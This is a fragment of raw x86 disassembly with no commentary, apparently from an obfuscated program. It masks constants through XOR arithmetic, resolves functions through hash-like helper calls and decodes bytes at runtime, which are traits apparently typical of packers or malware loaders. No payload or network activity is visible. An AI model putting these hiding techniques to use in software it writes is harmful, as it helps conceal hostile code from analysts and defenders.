  412a04:	mov    DWORD PTR [ebp-0x78],0xc0109f1
  412a0b:	mov    DWORD PTR [ebp-0x74],0x7a131f05
  412a12:	call   0x414b33
  412a17:	push   eax
  412a18:	mov    eax,DWORD PTR [ebp+0x8]
  412a1b:	mov    eax,DWORD PTR [eax+0x1a8]
  412a21:	push   DWORD PTR [eax]
  412a23:	call   0x4147d5
  412a28:	test   eax,eax
  412a2a:	jne    0x412a7c
  412a2c:	mov    eax,DWORD PTR [ebp+0x8]
  412a2f:	mov    eax,DWORD PTR [eax+0x1d8]
  412a35:	mov    edi,DWORD PTR [ebp+0x8]
  412a38:	add    eax,0x4
  412a3b:	mov    DWORD PTR [ebp-0x18],eax
  412a3e:	mov    eax,DWORD PTR [ebp+0x8]
  412a41:	mov    edx,DWORD PTR [eax+0x1b8]
  412a47:	call   0x414b33
  412a4c:	push   eax
  412a4d:	mov    eax,DWORD PTR [ebp-0x18]
  412a50:	call   DWORD PTR [eax]
  412a52:	test   eax,eax
  412a54:	jne    0x412a7c
  412a56:	mov    eax,DWORD PTR [ebp+0x8]
  412a59:	mov    eax,DWORD PTR [eax+0x1d8]
  412a5f:	mov    edi,DWORD PTR [ebp+0x8]
  412a62:	add    eax,0x10
  412a65:	mov    DWORD PTR [ebp-0x18],eax
  412a68:	mov    eax,DWORD PTR [ebp+0x8]
  412a6b:	mov    edx,DWORD PTR [eax+0x1b8]
  412a71:	call   0x414b33
  412a76:	push   eax
  412a77:	mov    eax,DWORD PTR [ebp-0x18]
  412a7a:	call   DWORD PTR [eax]
  412a7c:	mov    eax,DWORD PTR [ebp-0x8]
  412a7f:	mov    ecx,DWORD PTR [ebp-0x1c]
  412a82:	xor    eax,ebx
  412a84:	add    eax,esi
  412a86:	cmp    eax,ecx
  412a88:	je     0x412c07
  412a8e:	mov    eax,DWORD PTR [ebp-0x34]
  412a91:	xor    eax,ebx
  412a93:	mov    ecx,0xffcd8d23
  412a98:	sub    ecx,eax
  412a9a:	add    ecx,DWORD PTR [ebp-0x1c]
  412a9d:	mov    eax,DWORD PTR [ebp-0x14]
  412aa0:	cmp    eax,ecx
  412aa2:	ja     0x412c07
  412aa8:	mov    DWORD PTR [ebp-0x4],0x0
  412aaf:	push   DWORD PTR [ebp+0x8]
  412ab2:	mov    edi,DWORD PTR [ebp+0x8]
  412ab5:	mov    eax,DWORD PTR [ebp+0x8]
  412ab8:	mov    edx,DWORD PTR [eax+0x1b4]
  412abe:	call   0x414b33
  412ac3:	push   eax
  412ac4:	mov    eax,DWORD PTR [ebp+0x8]
  412ac7:	mov    eax,DWORD PTR [eax+0x1a8]
  412acd:	push   DWORD PTR [eax]
  412acf:	call   0x4147d5
  412ad4:	mov    ecx,DWORD PTR [ebp+0x8]
  412ad7:	mov    ecx,DWORD PTR [ecx+0x19c]
  412add:	mov    DWORD PTR [ecx],eax
  412adf:	mov    eax,DWORD PTR [ebp+0x8]
  412ae2:	mov    edi,DWORD PTR [eax+0x1d8]
  412ae8:	mov    esi,DWORD PTR [ebp+0x8]
  412aeb:	xor    eax,eax
  412aed:	lea    edx,[ebp-0x84]
  412af3:	call   0x414b69
  412af8:	push   eax
  412af9:	mov    eax,DWORD PTR [ebp+0x8]
  412afc:	mov    eax,DWORD PTR [eax+0x19c]
  412b02:	push   DWORD PTR [eax]
  412b04:	call   DWORD PTR [edi+0x8]
  412b07:	mov    DWORD PTR [ebp-0x18],eax
  412b0a:	mov    eax,DWORD PTR [ebp+0x8]
  412b0d:	mov    edi,DWORD PTR [eax+0x1d8]
  412b13:	mov    esi,DWORD PTR [ebp+0x8]
  412b16:	xor    eax,eax
  412b18:	lea    edx,[ebp-0x70]
  412b1b:	call   0x414b69
  412b20:	push   eax
  412b21:	mov    eax,DWORD PTR [ebp+0x8]
  412b24:	mov    eax,DWORD PTR [eax+0x19c]
  412b2a:	push   DWORD PTR [eax]
  412b2c:	call   DWORD PTR [edi+0x8]
  412b2f:	and    DWORD PTR [ebp-0x10],0x0
  412b33:	mov    eax,DWORD PTR [ebp-0x10]
  412b36:	and    eax,0x7
  412b39:	add    eax,0x31
  412b3c:	push   eax
  412b3d:	call   DWORD PTR [ebp-0x18]
  412b40:	test   eax,eax
  412b42:	jne    0x412b49
  412b44:	and    DWORD PTR [ebp-0xc],eax
  412b47:	jmp    0x412b71
  412b49:	mov    eax,DWORD PTR [ebp+0x8]
  412b4c:	mov    edi,DWORD PTR [eax+0x1d8]
  412b52:	mov    esi,DWORD PTR [ebp+0x8]
  412b55:	xor    eax,eax
  412b57:	lea    edx,[ebp-0x5c]
  412b5a:	call   0x414b69
  412b5f:	push   eax
  412b60:	mov    eax,DWORD PTR [ebp+0x8]
  412b63:	mov    eax,DWORD PTR [eax+0x198]
  412b69:	push   DWORD PTR [eax]
  412b6b:	call   DWORD PTR [edi+0x8]
  412b6e:	mov    DWORD PTR [ebp-0xc],eax
  412b71:	inc    DWORD PTR [ebp-0x10]
  412b74:	cmp    DWORD PTR [ebp-0x10],0x10
  412b78:	jb     0x412b33
  412b7a:	mov    eax,DWORD PTR [ebp-0x34]
  412b7d:	mov    esi,DWORD PTR [ebp+0x8]
  412b80:	xor    eax,ebx
  412b82:	mov    edi,0x3272dd
  412b87:	add    eax,edi
  412b89:	lea    edx,[ebp-0xcc]
  412b8f:	call   0x414b69
  412b94:	push   eax
  412b95:	mov    eax,DWORD PTR [ebp-0x8]
  412b98:	mov    esi,DWORD PTR [ebp+0x8]
  412b9b:	xor    eax,ebx
  412b9d:	add    eax,edi
  412b9f:	lea    edx,[ebp-0xec]
  412ba5:	call   0x414b69
  412baa:	push   eax
  412bab:	call   DWORD PTR [ebp-0xc]
  412bae:	mov    ecx,DWORD PTR [ebp-0x8]
  412bb1:	xor    ecx,ebx
  412bb3:	add    ecx,edi
  412bb5:	cmp    ecx,eax
  412bb7:	jne    0x412bc0
  412bb9:	mov    DWORD PTR [ebp-0x4],0x1
  412bc0:	mov    eax,DWORD PTR [ebp-0x34]
  412bc3:	mov    ecx,DWORD PTR [ebp-0x14]
  412bc6:	xor    eax,ebx
  412bc8:	lea    eax,[eax+ecx*1+0x3272dd]
  412bcf:	mov    DWORD PTR [ebp-0x14],eax
  412bd2:	mov    eax,DWORD PTR [ebp-0x4]
  412bd5:	test   eax,eax
  412bd7:	je     0x412beb
  412bd9:	mov    eax,DWORD PTR [ebp-0x34]
  412bdc:	mov    ecx,DWORD PTR [ebp-0x24]
  412bdf:	xor    eax,ebx
  412be1:	lea    eax,[eax+ecx*1+0x3272dd]
  412be8:	mov    DWORD PTR [ebp-0x24],eax
  412beb:	mov    eax,DWORD PTR [ebp-0x34]
  412bee:	xor    eax,ebx
  412bf0:	mov    ecx,0xffcd8d23
  412bf5:	sub    ecx,eax
  412bf7:	add    ecx,DWORD PTR [ebp-0x1c]
  412bfa:	mov    eax,DWORD PTR [ebp-0x14]
  412bfd:	cmp    eax,ecx
  412bff:	jbe    0x412aa8
  412c05:	mov    esi,edi
  412c07:	mov    eax,DWORD PTR [ebp-0x24]
  412c0a:	mov    ecx,DWORD PTR [ebp-0x14]
  412c0d:	cmp    ecx,eax
  412c0f:	jne    0x412c22
  412c11:	push   DWORD PTR [ebp+0x8]
  412c14:	lea    eax,[ebp-0x30]
  412c17:	push   eax
  412c18:	call   0x4155e2
  412c1d:	mov    DWORD PTR [ebp-0x20],eax
  412c20:	jmp    0x412c2e
  412c22:	mov    eax,DWORD PTR [ebp-0x20]
  412c25:	mov    ecx,DWORD PTR [ebp-0x34]
  412c28:	xor    ecx,ebx
  412c2a:	add    ecx,esi
  412c2c:	xor    DWORD PTR [eax],ecx
  412c2e:	mov    eax,DWORD PTR [ebp-0x8]
  412c31:	mov    ecx,DWORD PTR [ebp-0x20]
  412c34:	xor    eax,ebx
  412c36:	add    eax,esi
  412c38:	cmp    eax,ecx
  412c3a:	je     0x413224
  412c40:	mov    eax,DWORD PTR [ebp-0x8]
  412c43:	mov    ecx,DWORD PTR [ebp-0x30]
  412c46:	xor    eax,ebx
  412c48:	add    eax,esi
  412c4a:	cmp    eax,ecx
  412c4c:	je     0x413224
  412c52:	mov    eax,DWORD PTR [ebp-0x8]
  412c55:	xor    eax,ebx
  412c57:	add    eax,esi
  412c59:	jmp    0x412c77
  412c5b:	mov    edi,DWORD PTR [ebp-0x20]
  412c5e:	mov    cl,al
  412c60:	and    cl,0x1f
  412c63:	or     dl,0xff
  412c66:	sub    dl,cl
  412c68:	add    BYTE PTR [edi+eax*1],dl
  412c6b:	mov    ecx,DWORD PTR [ebp-0x34]
  412c6e:	xor    ecx,ebx
  412c70:	lea    eax,[eax+ecx*1+0x3272dd]
  412c77:	mov    ecx,DWORD PTR [ebp-0x30]
  412c7a:	cmp    eax,ecx
  412c7c:	jb     0x412c5b
  412c7e:	mov    eax,DWORD PTR [ebp-0x30]
  412c81:	mov    DWORD PTR [ebp-0x1c],eax
  412c84:	mov    eax,DWORD PTR [ebp-0x20]
  412c87:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  412c8e:	mov    DWORD PTR [ebp-0xa8],eax
  412c94:	mov    ecx,0xf89c85b2
  412c99:	mov    DWORD PTR [ebp-0x14],ecx
  412c9c:	mov    eax,DWORD PTR [ebp-0x24]
  412c9f:	xor    eax,ebx
  412ca1:	add    eax,esi
  412ca3:	mov    DWORD PTR [ebp-0x4],eax
  412ca6:	mov    eax,DWORD PTR [ebp-0x24]
  412ca9:	xor    eax,ebx
  412cab:	add    eax,esi
  412cad:	mov    DWORD PTR [ebp-0x10],eax
  412cb0:	mov    DWORD PTR [ebp-0x40],0xf89c85d5
  412cb7:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  412cbe:	mov    eax,DWORD PTR [ebp-0x24]
  412cc1:	mov    edx,DWORD PTR [ebp-0x1c]
  412cc4:	xor    eax,ebx
  412cc6:	add    eax,esi
  412cc8:	cmp    edx,eax
  412cca:	je     0x412e02
  412cd0:	jmp    0x412dde
  412cd5:	mov    edx,DWORD PTR [ebp-0x4]
  412cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  412cdb:	mov    edi,DWORD PTR [ebp-0x40]
  412cde:	sub    eax,edx
  412ce0:	xor    edi,ebx
  412ce2:	xor    edx,edx
  412ce4:	add    edi,esi
  412ce6:	div    edi
  412ce8:	mov    DWORD PTR [ebp-0x10],eax
  412ceb:	mov    eax,DWORD PTR [ebp-0x44]
  412cee:	mov    edx,DWORD PTR [ebp-0x10]
  412cf1:	xor    eax,ebx
  412cf3:	add    eax,esi
  412cf5:	cmp    edx,eax
  412cf7:	jbe    0x412d03
  412cf9:	mov    eax,DWORD PTR [ebp-0x44]
  412cfc:	xor    eax,ebx
  412cfe:	add    eax,esi
  412d00:	mov    DWORD PTR [ebp-0x10],eax
  412d03:	mov    eax,DWORD PTR [ebp-0x40]
  412d06:	mov    edx,DWORD PTR [ebp-0x10]
  412d09:	xor    eax,ebx
  412d0b:	add    eax,esi
  412d0d:	imul   eax,edx
  412d10:	mov    DWORD PTR [ebp-0x10],eax
  412d13:	mov    eax,DWORD PTR [ebp-0x24]
  412d16:	mov    edx,DWORD PTR [ebp-0x10]
  412d19:	xor    eax,ebx
  412d1b:	add    eax,esi
  412d1d:	cmp    edx,eax
  412d1f:	je     0x412dcc
  412d25:	mov    eax,DWORD PTR [ebp-0x10]
  412d28:	mov    DWORD PTR [ebp-0xc],eax
  412d2b:	mov    eax,DWORD PTR [ebp-0x4]
  412d2e:	add    eax,DWORD PTR [ebp-0xa8]
  412d34:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  412d3b:	mov    DWORD PTR [ebp-0x38],ecx
  412d3e:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  412d45:	mov    DWORD PTR [ebp-0x88],eax
  412d4b:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  412d52:	mov    DWORD PTR [ebp-0x94],ecx
  412d58:	mov    eax,DWORD PTR [ebp-0x18]
  412d5b:	xor    eax,ebx
  412d5d:	add    eax,esi
  412d5f:	jmp    0x412d8f
  412d61:	mov    eax,DWORD PTR [ebp-0x94]
  412d67:	mov    edx,DWORD PTR [ebp-0x10]
  412d6a:	xor    eax,ebx
  412d6c:	add    eax,esi
  412d6e:	imul   eax,edx
  412d71:	mov    edx,DWORD PTR [ebp-0x88]
  412d77:	mov    BYTE PTR [eax+edx*1],0x0
  412d7b:	mov    eax,DWORD PTR [ebp-0x28]
  412d7e:	mov    edx,DWORD PTR [ebp-0x38]
  412d81:	xor    eax,ebx
  412d83:	xor    edx,ebx
  412d85:	add    eax,esi
  412d87:	add    edx,esi
  412d89:	imul   eax,edx
  412d8c:	add    eax,DWORD PTR [ebp-0x10]
  412d8f:	mov    DWORD PTR [ebp-0x10],eax
  412d92:	mov    eax,DWORD PTR [ebp-0x10]
  412d95:	mov    edx,DWORD PTR [ebp-0xc]
  412d98:	cmp    edx,eax
  412d9a:	jb     0x412d61
  412d9c:	mov    eax,DWORD PTR [ebp-0x38]
  412d9f:	mov    edx,DWORD PTR [ebp-0xc]
  412da2:	xor    eax,ebx
  412da4:	add    eax,esi
  412da6:	imul   eax,edx
  412da9:	mov    edx,DWORD PTR [ebp-0x18]
  412dac:	xor    edx,ebx
  412dae:	add    edx,esi
  412db0:	or     eax,edx
  412db2:	mov    edx,DWORD PTR [ebp-0x14]
  412db5:	xor    edx,ebx
  412db7:	add    eax,edx
  412db9:	mov    edx,DWORD PTR [ebp-0x14]
  412dbc:	xor    edx,ebx
  412dbe:	add    eax,edx
  412dc0:	mov    edx,DWORD PTR [ebp-0x4]
  412dc3:	lea    eax,[eax+edx*1+0x64e5ba]
  412dca:	jmp    0x412ddb
  412dcc:	mov    eax,DWORD PTR [ebp-0x14]
  412dcf:	mov    edx,DWORD PTR [ebp-0x4]
  412dd2:	xor    eax,ebx
  412dd4:	lea    eax,[eax+edx*1+0x3272dd]
  412ddb:	mov    DWORD PTR [ebp-0x4],eax
  412dde:	mov    eax,DWORD PTR [ebp-0x14]
  412de1:	xor    eax,ebx
  412de3:	mov    edx,0xffcd8d23
  412de8:	sub    edx,eax
  412dea:	add    edx,DWORD PTR [ebp-0x1c]
  412ded:	mov    eax,DWORD PTR [ebp-0x14]
  412df0:	mov    edi,DWORD PTR [ebp-0x4]
  412df3:	xor    eax,ebx
  412df5:	add    eax,esi
  412df7:	imul   eax,edi
  412dfa:	cmp    eax,edx
  412dfc:	jbe    0x412cd5
  412e02:	mov    eax,DWORD PTR [ebp-0x8]
  412e05:	mov    ecx,DWORD PTR [ebp-0x30]
  412e08:	mov    eax,DWORD PTR [ebp+0x8]
  412e0b:	mov    edx,DWORD PTR [ebp-0x3c]
  412e0e:	mov    eax,DWORD PTR [eax+0x1d8]
  412e14:	xor    edx,ebx
  412e16:	add    edx,esi
  412e18:	push   edx
  412e19:	mov    edx,DWORD PTR [ebp-0x2c]
  412e1c:	xor    edx,ebx
  412e1e:	add    edx,esi
  412e20:	push   edx
  412e21:	push   ecx
  412e22:	mov    DWORD PTR [ebp-0x28],ecx
  412e25:	mov    ecx,DWORD PTR [ebp-0x8]
  412e28:	xor    ecx,ebx
  412e2a:	add    ecx,esi
  412e2c:	push   ecx
  412e2d:	call   DWORD PTR [eax+0x14]
  412e30:	mov    edi,eax
  412e32:	mov    eax,DWORD PTR [ebp-0x8]
  412e35:	xor    eax,ebx
  412e37:	add    eax,esi
  412e39:	cmp    eax,edi
  412e3b:	je     0x412e96
  412e3d:	mov    eax,DWORD PTR [ebp-0x8]
  412e40:	jmp    0x412e63
  412e42:	mov    ecx,DWORD PTR [ebp-0x20]
  412e45:	xor    eax,ebx
  412e47:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  412e4e:	mov    BYTE PTR [eax+edi*1+0x3272dd],cl
  412e55:	mov    ecx,DWORD PTR [ebp-0x34]
  412e58:	xor    ecx,ebx
  412e5a:	lea    eax,[ecx+eax*1+0x3272dd]
  412e61:	xor    eax,ebx
  412e63:	mov    ecx,DWORD PTR [ebp-0x30]
  412e66:	sub    ecx,esi
  412e68:	xor    ecx,ebx
  412e6a:	cmp    eax,ecx
  412e6c:	jne    0x412e42
  412e6e:	mov    eax,DWORD PTR [ebp+0x8]
  412e71:	mov    ecx,DWORD PTR [ebp-0x48]
  412e74:	mov    eax,DWORD PTR [eax+0x1d8]
  412e7a:	xor    ecx,ebx
  412e7c:	add    ecx,esi
  412e7e:	push   ecx
  412e7f:	mov    ecx,DWORD PTR [ebp-0x8]
  412e82:	xor    ecx,ebx
  412e84:	add    ecx,esi
  412e86:	push   ecx
  412e87:	push   DWORD PTR [ebp-0x20]
  412e8a:	call   DWORD PTR [eax+0x18]
  412e8d:	mov    eax,DWORD PTR [ebp-0x28]
  412e90:	mov    DWORD PTR [ebp-0x20],edi
  412e93:	mov    DWORD PTR [ebp-0x30],eax
  412e96:	mov    edi,DWORD PTR [ebp-0x20]
  412e99:	mov    eax,DWORD PTR [ebp-0x34]
  412e9c:	mov    ecx,DWORD PTR [ebp-0x8]
  412e9f:	xor    eax,ebx
  412ea1:	mov    DWORD PTR [ebp-0x28],edi
  412ea4:	add    eax,esi
  412ea6:	mov    DWORD PTR [ebp-0x50],0x3d122a12
  412ead:	mov    DWORD PTR [ebp-0x4c],0x27123f12
  412eb4:	jmp    0x412ee8
  412eb6:	xor    ecx,ebx
  412eb8:	mov    dl,BYTE PTR [ebp+ecx*1+0x32728d]
  412ebf:	xor    dl,0x71
  412ec2:	sub    dl,0xb
  412ec5:	mov    DWORD PTR [ebp-0x2c],ecx
  412ec8:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272dd]
  412ed0:	movzx  edx,dl
  412ed3:	cmp    ecx,edx
  412ed5:	jne    0x412ef2
  412ed7:	mov    ecx,DWORD PTR [ebp-0x34]
  412eda:	mov    edx,DWORD PTR [ebp-0x2c]
  412edd:	xor    ecx,ebx
  412edf:	lea    ecx,[ecx+edx*1+0x3272dd]
  412ee6:	xor    ecx,ebx
  412ee8:	cmp    ecx,0xf89c85bd
  412eee:	jne    0x412eb6
  412ef0:	jmp    0x412ef9
  412ef2:	mov    eax,DWORD PTR [ebp-0x8]
  412ef5:	xor    eax,ebx
  412ef7:	add    eax,esi
  412ef9:	mov    ecx,DWORD PTR [ebp-0x8]
  412efc:	xor    ecx,ebx
  412efe:	add    ecx,esi
  412f00:	cmp    ecx,eax
  412f02:	je     0x413075
  412f08:	mov    eax,DWORD PTR [edi+0x8]
  412f0b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  412f12:	mov    DWORD PTR [ebp-0x2c],0xf89cc304
  412f19:	mov    DWORD PTR [ebp-0x38],0xf89cb5b5
  412f20:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  412f27:	mov    DWORD PTR [ebp-0xc],eax
  412f2a:	mov    eax,DWORD PTR [ebp+0x8]
  412f2d:	mov    ecx,DWORD PTR [ebp-0x18]
  412f30:	xor    ecx,ebx
  412f32:	add    ecx,esi
  412f34:	push   ecx
  412f35:	mov    ecx,DWORD PTR [ebp-0x38]
  412f38:	mov    eax,DWORD PTR [eax+0x1d8]
  412f3e:	xor    ecx,ebx
  412f40:	add    ecx,esi
  412f42:	push   ecx
  412f43:	mov    ecx,DWORD PTR [ebp-0x2c]
  412f46:	xor    ecx,ebx
  412f48:	add    ecx,esi
  412f4a:	push   ecx
  412f4b:	mov    ecx,DWORD PTR [ebp-0x4]
  412f4e:	xor    ecx,ebx
  412f50:	add    ecx,esi
  412f52:	push   ecx
  412f53:	call   DWORD PTR [eax+0x14]
  412f56:	mov    edi,eax
  412f58:	mov    eax,DWORD PTR [ebp+0x8]
  412f5b:	mov    ecx,DWORD PTR [ebp-0x18]
  412f5e:	mov    eax,DWORD PTR [eax+0x1d8]
  412f64:	xor    ecx,ebx
  412f66:	add    ecx,esi
  412f68:	push   ecx
  412f69:	mov    ecx,DWORD PTR [ebp-0x38]
  412f6c:	xor    ecx,ebx
  412f6e:	add    ecx,esi
  412f70:	push   ecx
  412f71:	mov    ecx,DWORD PTR [ebp-0x4]
  412f74:	push   DWORD PTR [ebp-0xc]
  412f77:	xor    ecx,ebx
  412f79:	add    ecx,esi
  412f7b:	push   ecx
  412f7c:	call   DWORD PTR [eax+0x14]
  412f7f:	mov    ecx,DWORD PTR [ebp-0x4]
  412f82:	xor    ecx,ebx
  412f84:	add    ecx,esi
  412f86:	mov    DWORD PTR [ebp-0x18],eax
  412f89:	cmp    ecx,edi
  412f8b:	je     0x413251
  412f91:	mov    ecx,DWORD PTR [ebp-0x4]
  412f94:	xor    ecx,ebx
  412f96:	add    ecx,esi
  412f98:	cmp    ecx,eax
  412f9a:	je     0x413251
  412fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  412fa7:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  412fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  412fb1:	xor    cl,0x96
  412fb4:	sub    cl,0x23
  412fb7:	mov    BYTE PTR [edi],cl
  412fb9:	mov    ecx,DWORD PTR [ebp-0x4]
  412fbc:	xor    cl,0x96
  412fbf:	sub    cl,0x23
  412fc2:	mov    BYTE PTR [edi+0x1],cl
  412fc5:	mov    ecx,DWORD PTR [ebp-0x3c]
  412fc8:	xor    cl,0x96
  412fcb:	sub    cl,0x23
  412fce:	mov    BYTE PTR [edi+0x2],cl
  412fd1:	and    DWORD PTR [ebp-0x98],0x0
  412fd8:	and    DWORD PTR [ebp-0xa4],0x0
  412fdf:	lea    ecx,[ebp-0xa4]
  412fe5:	push   ecx
  412fe6:	push   DWORD PTR [ebp-0xc]
  412fe9:	push   eax
  412fea:	lea    eax,[ebp-0x98]
  412ff0:	push   eax
  412ff1:	mov    eax,DWORD PTR [ebp-0x28]
  412ff4:	push   DWORD PTR [eax+0xc]
  412ff7:	mov    eax,DWORD PTR [ebp-0x20]
  412ffa:	add    eax,0x10
  412ffd:	push   eax
  412ffe:	push   edi
  412fff:	call   0x41241b
  413004:	mov    DWORD PTR [ebp-0x2c],eax
  413007:	mov    eax,DWORD PTR [ebp+0x8]
  41300a:	mov    ecx,DWORD PTR [ebp-0x48]
  41300d:	mov    eax,DWORD PTR [eax+0x1d8]
  413013:	xor    ecx,ebx
  413015:	add    ecx,esi
  413017:	push   ecx
  413018:	mov    ecx,DWORD PTR [ebp-0x4]
  41301b:	xor    ecx,ebx
  41301d:	add    ecx,esi
  41301f:	push   ecx
  413020:	push   edi
  413021:	call   DWORD PTR [eax+0x18]
  413024:	mov    eax,DWORD PTR [ebp-0x2c]
  413027:	add    eax,0xffcd8d23
  41302c:	xor    eax,ebx
  41302e:	cmp    eax,0xf89c85b5
  413033:	mov    eax,DWORD PTR [ebp+0x8]
  413036:	mov    eax,DWORD PTR [eax+0x1d8]
  41303c:	mov    ecx,DWORD PTR [ebp-0x48]
  41303f:	jne    0x413062
  413041:	xor    ecx,ebx
  413043:	add    ecx,esi
  413045:	push   ecx
  413046:	mov    ecx,DWORD PTR [ebp-0x4]
  413049:	xor    ecx,ebx
  41304b:	add    ecx,esi
  41304d:	push   ecx
  41304e:	push   DWORD PTR [ebp-0x20]
  413051:	call   DWORD PTR [eax+0x18]
  413054:	mov    eax,DWORD PTR [ebp-0x18]
  413057:	mov    DWORD PTR [ebp-0x20],eax
  41305a:	mov    eax,DWORD PTR [ebp-0xc]
  41305d:	mov    DWORD PTR [ebp-0x30],eax
  413060:	jmp    0x413075
  413062:	xor    ecx,ebx
  413064:	add    ecx,esi
  413066:	push   ecx
  413067:	mov    ecx,DWORD PTR [ebp-0x4]
  41306a:	xor    ecx,ebx
  41306c:	add    ecx,esi
  41306e:	push   ecx
  41306f:	push   DWORD PTR [ebp-0x18]
  413072:	call   DWORD PTR [eax+0x18]
  413075:	mov    eax,DWORD PTR [ebp-0x30]
  413078:	mov    DWORD PTR [ebp-0x24],eax
  41307b:	mov    eax,DWORD PTR [ebp-0x20]
  41307e:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  413085:	mov    DWORD PTR [ebp-0x2c],eax
  413088:	mov    ecx,0xf89c85b2
  41308d:	mov    DWORD PTR [ebp-0x14],ecx
  413090:	mov    eax,DWORD PTR [ebp-0x1c]
  413093:	xor    eax,ebx
  413095:	add    eax,esi
  413097:	mov    DWORD PTR [ebp-0x4],eax
  41309a:	mov    eax,DWORD PTR [ebp-0x1c]
  41309d:	xor    eax,ebx
  41309f:	add    eax,esi
  4130a1:	mov    DWORD PTR [ebp-0xc],eax
  4130a4:	mov    DWORD PTR [ebp-0x38],0xf89c85d5
  4130ab:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  4130b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4130b5:	mov    edx,DWORD PTR [ebp-0x24]
  4130b8:	xor    eax,ebx
  4130ba:	add    eax,esi
  4130bc:	cmp    edx,eax
  4130be:	je     0x4131ed
  4130c4:	jmp    0x4131c9
  4130c9:	mov    edx,DWORD PTR [ebp-0x4]
  4130cc:	mov    eax,DWORD PTR [ebp-0x24]
  4130cf:	mov    edi,DWORD PTR [ebp-0x38]
  4130d2:	sub    eax,edx
  4130d4:	xor    edi,ebx
  4130d6:	xor    edx,edx
  4130d8:	add    edi,esi
  4130da:	div    edi
  4130dc:	mov    DWORD PTR [ebp-0xc],eax
  4130df:	mov    eax,DWORD PTR [ebp-0x18]
  4130e2:	mov    edx,DWORD PTR [ebp-0xc]
  4130e5:	xor    eax,ebx
  4130e7:	add    eax,esi
  4130e9:	cmp    edx,eax
  4130eb:	jbe    0x4130f7
  4130ed:	mov    eax,DWORD PTR [ebp-0x18]
  4130f0:	xor    eax,ebx
  4130f2:	add    eax,esi
  4130f4:	mov    DWORD PTR [ebp-0xc],eax
  4130f7:	mov    eax,DWORD PTR [ebp-0x38]
  4130fa:	mov    edx,DWORD PTR [ebp-0xc]
  4130fd:	xor    eax,ebx
  4130ff:	add    eax,esi
  413101:	imul   eax,edx
  413104:	mov    DWORD PTR [ebp-0xc],eax
  413107:	mov    eax,DWORD PTR [ebp-0x1c]
  41310a:	mov    edx,DWORD PTR [ebp-0xc]
  41310d:	xor    eax,ebx
  41310f:	add    eax,esi
  413111:	cmp    edx,eax
  413113:	je     0x4131b7
  413119:	mov    eax,DWORD PTR [ebp-0xc]
  41311c:	mov    DWORD PTR [ebp-0xc],eax
  41311f:	mov    eax,DWORD PTR [ebp-0x4]
  413122:	add    eax,DWORD PTR [ebp-0x2c]
  413125:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  41312c:	mov    DWORD PTR [ebp-0x40],ecx
  41312f:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  413136:	mov    DWORD PTR [ebp-0x28],eax
  413139:	mov    DWORD PTR [ebp-0x88],0xf89c85b0
  413143:	mov    DWORD PTR [ebp-0x3c],ecx
  413146:	mov    eax,DWORD PTR [ebp-0x44]
  413149:	xor    eax,ebx
  41314b:	add    eax,esi
  41314d:	jmp    0x41317a
  41314f:	mov    eax,DWORD PTR [ebp-0x3c]
  413152:	mov    edx,DWORD PTR [ebp-0x10]
  413155:	xor    eax,ebx
  413157:	add    eax,esi
  413159:	imul   eax,edx
  41315c:	mov    edx,DWORD PTR [ebp-0x28]
  41315f:	mov    BYTE PTR [eax+edx*1],0x0
  413163:	mov    eax,DWORD PTR [ebp-0x88]
  413169:	mov    edx,DWORD PTR [ebp-0x40]
  41316c:	xor    eax,ebx
  41316e:	xor    edx,ebx
  413170:	add    eax,esi
  413172:	add    edx,esi
  413174:	imul   eax,edx
  413177:	add    eax,DWORD PTR [ebp-0x10]
  41317a:	mov    DWORD PTR [ebp-0x10],eax
  41317d:	mov    eax,DWORD PTR [ebp-0x10]
  413180:	mov    edx,DWORD PTR [ebp-0xc]
  413183:	cmp    edx,eax
  413185:	jb     0x41314f
  413187:	mov    eax,DWORD PTR [ebp-0x40]
  41318a:	mov    edx,DWORD PTR [ebp-0xc]
  41318d:	xor    eax,ebx
  41318f:	add    eax,esi
  413191:	imul   eax,edx
  413194:	mov    edx,DWORD PTR [ebp-0x44]
  413197:	xor    edx,ebx
  413199:	add    edx,esi
  41319b:	or     eax,edx
  41319d:	mov    edx,DWORD PTR [ebp-0x14]
  4131a0:	xor    edx,ebx
  4131a2:	add    eax,edx
  4131a4:	mov    edx,DWORD PTR [ebp-0x14]
  4131a7:	xor    edx,ebx
  4131a9:	add    eax,edx
  4131ab:	mov    edx,DWORD PTR [ebp-0x4]
  4131ae:	lea    eax,[eax+edx*1+0x64e5ba]
  4131b5:	jmp    0x4131c6
  4131b7:	mov    eax,DWORD PTR [ebp-0x14]
  4131ba:	mov    edx,DWORD PTR [ebp-0x4]
  4131bd:	xor    eax,ebx
  4131bf:	lea    eax,[eax+edx*1+0x3272dd]
  4131c6:	mov    DWORD PTR [ebp-0x4],eax
  4131c9:	mov    eax,DWORD PTR [ebp-0x14]
  4131cc:	xor    eax,ebx
  4131ce:	mov    edx,0xffcd8d23
  4131d3:	sub    edx,eax
  4131d5:	add    edx,DWORD PTR [ebp-0x24]
  4131d8:	mov    eax,DWORD PTR [ebp-0x14]
  4131db:	mov    edi,DWORD PTR [ebp-0x4]
  4131de:	xor    eax,ebx
  4131e0:	add    eax,esi
  4131e2:	imul   eax,edi
  4131e5:	cmp    eax,edx
  4131e7:	jbe    0x4130c9
  4131ed:	push   DWORD PTR [ebp+0x8]
  4131f0:	mov    eax,DWORD PTR [ebp+0x8]
  4131f3:	push   DWORD PTR [eax+0x1cc]
  4131f9:	lea    eax,[ebp-0xa0]
  4131ff:	push   eax
  413200:	mov    eax,DWORD PTR [ebp+0x8]
  413203:	mov    eax,DWORD PTR [eax+0x1c4]
  413209:	push   DWORD PTR [eax]
